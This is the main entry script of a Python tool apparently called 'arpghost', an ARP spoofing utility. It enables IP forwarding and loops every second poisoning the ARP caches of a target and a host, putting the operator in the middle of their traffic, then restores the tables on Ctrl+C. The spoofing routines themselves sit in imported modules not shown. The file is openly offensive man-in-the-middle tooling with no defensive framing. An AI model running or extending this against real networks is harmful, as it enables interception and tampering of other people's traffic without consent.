from time import sleep

from arpghost.utils.route import route
from arpghost.utils.spoof import spoof, restore

from arpghost.config.colors import COLORS

from arpghost.banner.banner import init
from arpghost.argparser.parser import parser


def main():
    args = parser(

    )


    init()

    
    route()


    try:
        while True:
            spoof(
                args.target,
                args.host,
                args.verbose
            )

            spoof(
                args.host,
                args.target,
                args.verbose
            )

            sleep(1)

    except KeyboardInterrupt:
        print(
            f"{COLORS['RESET']}[!] {COLORS['ROUTE']}Detected CTRL+C ! restoring the network, please wait..."
        )

        print()
        
        restore(
            args.target,
            args.host
        )

        restore(
            args.host,
            args.target
        )


if __name__ ==  '__main__':
    main()
